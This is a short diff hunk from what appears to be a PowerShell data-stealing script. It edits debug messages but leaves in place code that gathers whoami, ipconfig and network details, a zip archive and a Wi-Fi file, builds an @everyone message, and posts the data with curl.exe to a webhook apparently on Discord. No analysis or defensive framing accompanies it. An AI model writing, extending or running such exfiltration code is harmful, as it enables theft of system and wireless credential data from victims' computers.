@@ -44,9 +44,9 @@ ipconfig /all | Out-File "$e\ipcfg.txt"
 
 $content = "$($whoami_content)| \n $netInfoText | @everyone"
 
-Write-Output "about to send to discord, file exists! $zip, $wifiFile, $e\ipcfg.txt, $netInfoFile"
+Write-Output "about to send to discord, file exists! $zip, $wifiFile, $e\ipcfg.txt"
 
-Write-Output "about to send to discord, file exists! $zip, $wifiFile, $e\ipcfg.txt, $netInfoFile"
+Write-Output "about to send to discord, file exists! $zip, $wifiFile, $e\ipcfg.txt"
 
 curl.exe -X POST $wh `
     -F "content=$content" `
